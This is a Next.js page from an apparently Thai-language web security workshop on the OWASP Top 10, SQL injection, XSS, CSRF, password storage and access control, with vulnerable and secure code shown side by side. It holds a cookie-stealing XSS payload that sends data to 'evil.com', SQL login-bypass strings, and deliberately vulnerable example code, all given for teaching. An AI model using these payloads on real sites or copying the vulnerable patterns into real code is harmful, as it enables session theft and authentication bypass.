import SectionHero from '@/components/SectionHero'
import CodeBlock from '@/components/CodeBlock'
import WorkshopBox from '@/components/WorkshopBox'
import Link from 'next/link'

const owaspTop10 = [
  { id: 'A01', title: 'Broken Access Control', desc: 'ผู้ใช้สามารถเข้าถึง resource ที่ไม่มีสิทธิ์ได้', featured: true, icon: 'fas fa-door-open' },
  { id: 'A02', title: 'Cryptographic Failures', desc: 'การเข้ารหัสที่อ่อนแอหรือไม่มีการเข้ารหัส', featured: true, icon: 'fas fa-lock-open' },
  { id: 'A03', title: 'Injection', desc: 'SQL, NoSQL, Command, LDAP Injection', featured: true, icon: 'fas fa-syringe' },
  { id: 'A04', title: 'Insecure Design', desc: 'ออกแบบ security ไว้ไม่ดีตั้งแต่แรก', featured: false, icon: 'fas fa-pencil-ruler' },
  { id: 'A05', title: 'Security Misconfiguration', desc: 'ตั้งค่า default ไม่ปลอดภัย, debug mode เปิด', featured: false, icon: 'fas fa-sliders' },
  { id: 'A06', title: 'Vulnerable Components', desc: 'ใช้ library/framework ที่มีช่องโหว่', featured: false, icon: 'fas fa-box-open' },
  { id: 'A07', title: 'Auth Failures', desc: 'การ authentication ที่ล้มเหลว, weak password', featured: true, icon: 'fas fa-user-lock' },
  { id: 'A08', title: 'Data Integrity Failures', desc: 'CI/CD pipeline ที่ไม่ปลอดภัย, insecure deserialization', featured: false, icon: 'fas fa-database' },
  { id: 'A09', title: 'Logging Failures', desc: 'ไม่มี logging, ไม่ monitor ความผิดปกติ', featured: false, icon: 'fas fa-file-lines' },
  { id: 'A10', title: 'SSRF', desc: 'Server-Side Request Forgery', featured: false, icon: 'fas fa-network-wired' },
]

const xssTypes = [
  {
    type: 'Reflected XSS',
    icon: 'fas fa-mirror',
    color: 'border-red-400',
    headerColor: 'bg-red-50 border-red-200',
    titleColor: 'text-red-600',
    desc: 'Script ใน URL ถูกสะท้อนกลับมาในหน้าเว็บทันที ผู้โจมตีต้องหลอกให้ victim คลิก link ที่มี script',
    example: 'https://site.com/search?q=<script>alert(document.cookie)</script>',
    impact: 'ขโมย session cookie, redirect ไป phishing site',
    prevention: 'Validate และ encode URL parameters ก่อนแสดงผล',
  },
  {
    type: 'Stored XSS',
    icon: 'fas fa-database',
    color: 'border-orange-400',
    headerColor: 'bg-orange-50 border-orange-200',
    titleColor: 'text-orange-600',
    desc: 'Script ถูกเก็บในฐานข้อมูลและแสดงให้ผู้ใช้คนอื่นทุกคนที่เข้าชม ร้ายแรงที่สุดเพราะกระทบทุกคน',
    example: 'Comment: "Nice post! <script>fetch(\'evil.com?\'+document.cookie)</script>"',
    impact: 'กระทบผู้ใช้ทุกคนที่เห็น comment นั้น, สามารถ spread ได้แบบ worm',
    prevention: 'Sanitize input ก่อนเก็บ, Escape output ก่อนแสดง',
  },
  {
    type: 'DOM-based XSS',
    icon: 'fas fa-code',
    color: 'border-violet-400',
    headerColor: 'bg-violet-50 border-violet-200',
    titleColor: 'text-violet-600',
    desc: 'JavaScript ฝั่ง client อ่านข้อมูลจาก URL/source แล้วเขียนลง DOM โดยไม่ escape ไม่ต้องผ่าน server',
    example: 'document.getElementById("msg").innerHTML = location.hash.slice(1)',
    impact: 'รัน script ใน browser ของ victim โดยตรง ตรวจจับได้ยากกว่า',
    prevention: 'ใช้ textContent แทน innerHTML, หลีกเลี่ยง eval()',
  },
]

export default function SecurityPage() {
  return (
    <div>
      <SectionHero
        number="03"
        title="Web Security Essentials"
        subtitle="OWASP Top 10 ช่องโหว่ที่พบบ่อย และวิธีป้องกันที่ต้องรู้"
        icon="fas fa-shield-halved"
        imageUrl="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1400&auto=format&fit=crop&q=80"
      />

      {/* OWASP Top 10 */}
      <section className="max-w-6xl mx-auto px-6 py-20">
        <div className="text-center mb-14">
          <h2 className="text-3xl font-black text-slate-900 mb-4">OWASP Top 10 — 2021</h2>
          <div className="w-16 h-1 bg-sky-500 rounded-full mx-auto mb-4"></div>
          <p className="text-slate-500">ช่องโหว่ด้านความปลอดภัยที่พบบ่อยที่สุดในเว็บแอปพลิเคชัน</p>
          <p className="text-sm text-sky-600 mt-2">
            <i className="fas fa-star text-xs mr-1"></i>
            เน้น A01, A02, A03, A07 ในวันนี้
          </p>
        </div>

        <div className="grid md:grid-cols-2 gap-4">
          {owaspTop10.map((item) => (
            <div
              key={item.id}
              className={`flex items-center gap-4 p-4 rounded-xl border transition-all ${
                item.featured
                  ? 'bg-sky-50 border-sky-300 shadow-sm'
                  : 'bg-white border-slate-200'
              }`}
            >
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${
                item.featured ? 'bg-sky-500' : 'bg-slate-200'
              }`}>
                <i className={`${item.icon} text-sm ${item.featured ? 'text-white' : 'text-slate-500'}`}></i>
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className={`font-black text-sm ${item.featured ? 'text-sky-700' : 'text-slate-500'}`}>{item.id}</span>
                  <span className={`font-bold text-sm ${item.featured ? 'text-slate-900' : 'text-slate-600'}`}>{item.title}</span>
                  {item.featured && (
                    <span className="text-xs bg-sky-500 text-white px-2 py-0.5 rounded-full">เน้น</span>
                  )}
                </div>
                <p className="text-xs text-slate-500 mt-0.5">{item.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* SQL Injection */}
      <section className="bg-slate-900 text-white py-20">
        <div className="max-w-6xl mx-auto px-6">
          <div className="text-center mb-14">
            <h2 className="text-3xl font-black text-white mb-4">
              <span className="text-sky-400">A03</span> — SQL Injection
            </h2>
            <div className="w-16 h-1 bg-sky-500 rounded-full mx-auto mb-4"></div>
            <p className="text-slate-400">การโจมตีที่ผู้ใช้แทรก SQL command ผ่าน input เพื่อเข้าถึงหรือแก้ไขข้อมูล</p>
          </div>

          {/* How it works */}
          <div className="bg-slate-800 rounded-2xl p-8 mb-8 border border-slate-700">
            <h3 className="font-bold text-white text-xl mb-6">
              <i className="fas fa-question-circle text-sky-400 mr-2"></i>
              ทำงานอย่างไร?
            </h3>
            <div className="grid md:grid-cols-3 gap-6 mb-6">
              {[
                { step: '1', title: 'ผู้โจมตีส่ง input พิเศษ', desc: "username: admin' OR '1'='1" },
                { step: '2', title: 'Server นำไปใส่ใน SQL ตรงๆ', desc: "WHERE username='admin' OR '1'='1'" },
                { step: '3', title: 'Condition เป็น true เสมอ', desc: 'login ได้โดยไม่มี password!' },
              ].map((s) => (
                <div key={s.step} className="text-center">
                  <div className="w-10 h-10 bg-red-500 rounded-full flex items-center justify-center text-white font-bold mx-auto mb-3">{s.step}</div>
                  <p className="font-semibold text-white text-sm mb-1">{s.title}</p>
                  <code className="text-red-300 text-xs font-mono">{s.desc}</code>
                </div>
              ))}
            </div>
          </div>

          <div className="grid md:grid-cols-2 gap-6 mb-8">
            <CodeBlock
              variant="vulnerable"
              label="VULNERABLE — String Concatenation"
              code={`// JavaScript (Node.js + MySQL) — WRONG!
const query = \`SELECT * FROM users
  WHERE username = '\${req.body.username}'
  AND password = '\${req.body.password}'\`;
await db.execute(query);

// ถ้าส่ง: username = "admin' --"
// Query: SELECT * FROM users
//   WHERE username = 'admin' --' AND password = '...'
// "--" คือ comment ใน SQL → bypass password check!

// Python + SQLite — WRONG!
cursor.execute(
  f"SELECT * FROM users WHERE id = {user_id}"
)`}
            />

            <CodeBlock
              variant="secure"
              label="SECURE — Parameterized Queries"
              code={`// JavaScript + mysql2 — CORRECT!
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
const [rows] = await db.execute(query, [username, password]);

// Python — CORRECT!
cursor.execute(
  "SELECT * FROM users WHERE id = %s",
  (user_id,)
)

// Node.js + Prisma ORM — CORRECT! (ปลอดภัยโดยอัตโนมัติ)
const user = await prisma.user.findFirst({
  where: { username, password: hashedPassword }
});

// กฎ: ห้าม string concatenation ใน SQL เด็ดขาด!`}
            />
          </div>

          <div className="grid md:grid-cols-3 gap-4">
            {[
              { icon: 'fas fa-database', title: 'ใช้ Parameterized Queries', desc: 'ทุกครั้งที่มี dynamic input ใน SQL' },
              { icon: 'fas fa-layer-group', title: 'ใช้ ORM', desc: 'Prisma, TypeORM, Sequelize ปลอดภัยโดย design' },
              { icon: 'fas fa-check-square', title: 'Input Validation', desc: 'Validate type, length ก่อน query เสมอ' },
            ].map((tip) => (
              <div key={tip.title} className="bg-emerald-900/30 border border-emerald-700 rounded-xl p-4">
                <i className={`${tip.icon} text-emerald-400 mb-2 block`}></i>
                <p className="font-semibold text-emerald-300 text-sm mb-1">{tip.title}</p>
                <p className="text-slate-400 text-xs">{tip.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* XSS */}
      <section className="max-w-6xl mx-auto px-6 py-20">
        <div className="text-center mb-14">
          <h2 className="text-3xl font-black text-slate-900 mb-4">
            <span className="text-sky-600">A03</span> — Cross-Site Scripting (XSS)
          </h2>
          <div className="w-16 h-1 bg-sky-500 rounded-full mx-auto mb-4"></div>
          <p className="text-slate-500">การแทรก script ที่เป็นอันตรายเข้าไปในหน้าเว็บของผู้อื่น</p>
        </div>

        <div className="grid md:grid-cols-3 gap-6 mb-12">
          {xssTypes.map((xss) => (
            <div key={xss.type} className={`bg-white border-t-4 ${xss.color} rounded-2xl overflow-hidden border border-slate-200`}>
              <div className={`${xss.headerColor} border-b p-4`}>
                <div className="flex items-center gap-2 mb-1">
                  <i className={`${xss.icon} ${xss.titleColor} text-sm`}></i>
                  <h3 className={`font-bold ${xss.titleColor}`}>{xss.type}</h3>
                </div>
              </div>
              <div className="p-5 space-y-3">
                <p className="text-slate-600 text-sm">{xss.desc}</p>
                <div className="bg-slate-900 rounded-lg p-3">
                  <code className="text-slate-300 text-xs font-mono break-all">{xss.example}</code>
                </div>
                <div className="text-xs space-y-1">
                  <p className="text-red-600"><strong>Impact:</strong> {xss.impact}</p>
                  <p className="text-emerald-600"><strong>Prevention:</strong> {xss.prevention}</p>
                </div>
              </div>
            </div>
          ))}
        </div>

        <div className="grid md:grid-cols-2 gap-6">
          <CodeBlock
            variant="vulnerable"
            label="VULNERABLE — innerHTML + direct output"
            code={`// JavaScript — WRONG!
// ถ้า userInput = '<script>steal(document.cookie)</script>'
document.getElementById('msg').innerHTML = userInput;
// Script จะรันทันที!

// PHP template — WRONG!
echo "<p>Hello, " . $_GET['name'] . "!</p>";
// URL: ?name=<script>alert('XSS')</script>

// React dangerouslySetInnerHTML — ระวัง!
<div dangerouslySetInnerHTML={{ __html: userContent }} />`}
          />
          <CodeBlock
            variant="secure"
            label="SECURE — textContent + escape + CSP"
            code={`// JavaScript — CORRECT!
document.getElementById('msg').textContent = userInput;
// textContent ไม่ parse HTML

// PHP — CORRECT!
echo "<p>Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES) . "!</p>";

// React — CORRECT! (ปลอดภัยโดยอัตโนมัติ)
return <p>Hello, {userName}</p>; // React escape ให้

// ถ้าต้องรับ HTML: ใช้ DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHTML);
<div dangerouslySetInnerHTML={{ __html: clean }} />`}
          />
        </div>

        {/* CSP */}
        <div className="mt-8 bg-sky-50 border border-sky-200 rounded-2xl p-6">
          <h3 className="font-bold text-sky-900 text-lg mb-3">
            <i className="fas fa-shield-halved text-sky-500 mr-2"></i>
            Content Security Policy (CSP)
          </h3>
          <p className="text-sky-800 text-sm mb-4">
            CSP เป็น HTTP header ที่บอก browser ว่า script จาก source ไหนถึงจะรันได้ เป็น defense-in-depth สำหรับ XSS
          </p>
          <CodeBlock
            variant="neutral"
            language="HTTP Header"
            code={`// next.config.js — เพิ่ม CSP header
async headers() {
  return [{
    source: '/(.*)',
    headers: [{
      key: 'Content-Security-Policy',
      value: [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'", // ในทางปฏิบัติ Next.js ต้องการ
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        "img-src 'self' data: https://images.unsplash.com",
        "font-src 'self' https://fonts.gstatic.com",
      ].join('; ')
    }]
  }];
}`}
          />
        </div>
      </section>

      {/* Auth & CSRF */}
      <section className="bg-slate-50 py-20">
        <div className="max-w-6xl mx-auto px-6">
          <div className="text-center mb-14">
            <h2 className="text-3xl font-black text-slate-900 mb-4">
              <span className="text-sky-600">A01, A07</span> — Access Control, Authentication & CSRF
            </h2>
            <div className="w-16 h-1 bg-sky-500 rounded-full mx-auto"></div>
          </div>

          <div className="grid md:grid-cols-2 gap-8 mb-12">
            {/* Password */}
            <div className="bg-white rounded-2xl p-6 border border-slate-200">
              <div className="flex items-center gap-3 mb-4">
                <i className="fas fa-key text-sky-500 text-xl"></i>
                <h3 className="font-bold text-slate-900 text-xl">Password Storage</h3>
              </div>
              <div className="space-y-3 mb-4">
                {[
                  { label: 'Plain Text', status: 'NEVER', color: 'bg-red-100 text-red-700 border-red-200' },
                  { label: 'MD5 / SHA-1', status: 'NEVER', color: 'bg-red-100 text-red-700 border-red-200' },
                  { label: 'bcrypt (rounds ≥ 12)', status: 'CORRECT', color: 'bg-emerald-100 text-emerald-700 border-emerald-200' },
                  { label: 'Argon2id', status: 'CORRECT', color: 'bg-emerald-100 text-emerald-700 border-emerald-200' },
                ].map((item) => (
                  <div key={item.label} className={`flex items-center justify-between p-3 rounded-lg border ${item.color}`}>
                    <code className="font-mono text-sm">{item.label}</code>
                    <span className="font-bold text-xs">{item.status}</span>
                  </div>
                ))}
              </div>
              <CodeBlock
                variant="neutral"
                language="Node.js"
                code={`const bcrypt = require('bcrypt');
// Hash password (ใช้ rounds 12+)
const hash = await bcrypt.hash(password, 12);

// Verify
const isMatch = await bcrypt.compare(input, hash);
// hash แต่ละครั้งต่างกัน (salt อัตโนมัติ)`}
              />
            </div>

            {/* CSRF */}
            <div className="bg-white rounded-2xl p-6 border border-slate-200">
              <div className="flex items-center gap-3 mb-4">
                <i className="fas fa-shield text-sky-500 text-xl"></i>
                <h3 className="font-bold text-slate-900 text-xl">CSRF Protection</h3>
              </div>
              <p className="text-slate-600 text-sm mb-4">
                CSRF (Cross-Site Request Forgery) หลอกให้ browser ของ victim ส่ง request ไปยัง site ที่ victim login ไว้
              </p>
              <div className="space-y-3">
                {[
                  { title: 'CSRF Token', desc: 'สร้าง token สุ่มต่อ session ส่งพร้อม form' },
                  { title: 'SameSite Cookie', desc: 'ตั้ง SameSite=Lax หรือ Strict ป้องกัน cross-origin' },
                  { title: 'Custom Headers', desc: 'SPA ที่ใช้ Bearer token ปลอดภัยจาก CSRF โดยธรรมชาติ' },
                  { title: 'Verify Origin', desc: 'Check Origin/Referer header ใน critical actions' },
                ].map((item) => (
                  <div key={item.title} className="flex gap-3 p-3 bg-sky-50 rounded-xl border border-sky-100">
                    <i className="fas fa-check-circle text-sky-500 mt-0.5 flex-shrink-0 text-sm"></i>
                    <div>
                      <p className="font-semibold text-slate-800 text-sm">{item.title}</p>
                      <p className="text-slate-500 text-xs">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Access Control */}
          <div className="bg-white rounded-2xl p-6 border border-slate-200">
            <div className="flex items-center gap-3 mb-6">
              <i className="fas fa-door-open text-sky-500 text-xl"></i>
              <h3 className="font-bold text-slate-900 text-xl">A01 — Broken Access Control</h3>
            </div>
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <p className="text-slate-600 text-sm mb-4">
                  ช่องโหว่อันดับ 1 ใน OWASP 2021 — ผู้ใช้สามารถเข้าถึง resource หรือทำ action ที่ไม่มีสิทธิ์
                </p>
                <div className="space-y-2 text-sm">
                  {[
                    'เข้า /admin โดยไม่ได้เป็น admin',
                    'แก้ไข /api/users/123 ทั้งที่เป็น user คนอื่น',
                    'ดู document ของ user อื่นด้วย IDOR',
                    'Privilege escalation — เพิ่มสิทธิ์ตัวเอง',
                  ].map((e) => (
                    <div key={e} className="flex items-center gap-2 text-red-600">
                      <i className="fas fa-xmark text-xs"></i>
                      <span>{e}</span>
                    </div>
                  ))}
                </div>
              </div>
              <CodeBlock
                variant="neutral"
                language="Next.js Middleware"
                code={`// middleware.ts — ป้องกัน route
import { NextResponse } from 'next/server';
import { verifyToken } from './lib/auth';

export async function middleware(request) {
  const token = request.cookies.get('token')?.value;

  // ไม่มี token → redirect ไป login
  if (!token) return NextResponse.redirect('/login');

  const payload = await verifyToken(token);

  // ต้อง admin แต่ไม่ใช่ → 403
  if (request.nextUrl.pathname.startsWith('/admin')) {
    if (payload.role !== 'admin') {
      return new NextResponse('Forbidden', { status: 403 });
    }
  }
  return NextResponse.next();
}`}
              />
            </div>
          </div>
        </div>
      </section>

      {/* Workshop */}
      <section className="max-w-6xl mx-auto px-6 py-4">
        <WorkshopBox
          number={1}
          title="Security Code Review"
          timeEstimate="20 นาที"
          steps={[
            {
              step: 1,
              title: 'เปิด code ตัวอย่างที่มีช่องโหว่',
              description: 'ดู code ที่ผู้วิทยากรแจก มีช่องโหว่อะไรบ้าง?',
            },
            {
              step: 2,
              title: 'ระบุประเภทช่องโหว่',
              description: 'แต่ละ bug คือ SQLi, XSS, หรือ Auth failure?',
            },
            {
              step: 3,
              title: 'ใช้ Copilot Review',
              code: 'Review this code for security vulnerabilities.\nIdentify each issue, explain the risk, and suggest a secure fix.',
            },
            {
              step: 4,
              title: 'เขียน fix และทดสอบ',
              description: 'แก้ไขช่องโหว่ทั้งหมด อธิบายว่าแก้อย่างไรและทำไม',
            },
          ]}
          copilotPrompt="Review this code for security vulnerabilities. Identify each issue, categorize it (SQL Injection / XSS / CSRF / Auth), explain the risk, and provide a secure fix with explanation."
        />
      </section>

      {/* Navigation */}
      <div className="border-t border-slate-100 py-8">
        <div className="max-w-6xl mx-auto px-6 flex justify-between items-center">
          <Link href="/section/02-fundamentals" className="text-slate-500 hover:text-sky-500 flex items-center gap-2 text-sm font-medium transition-colors">
            <i className="fas fa-arrow-left text-xs"></i> 02 — Fundamentals
          </Link>
          <Link href="/section/04-nextjs" className="text-sky-500 hover:text-sky-600 flex items-center gap-2 text-sm font-medium transition-colors">
            04 — Next.js <i className="fas fa-arrow-right text-xs"></i>
          </Link>
        </div>
      </div>
    </div>
  )
}
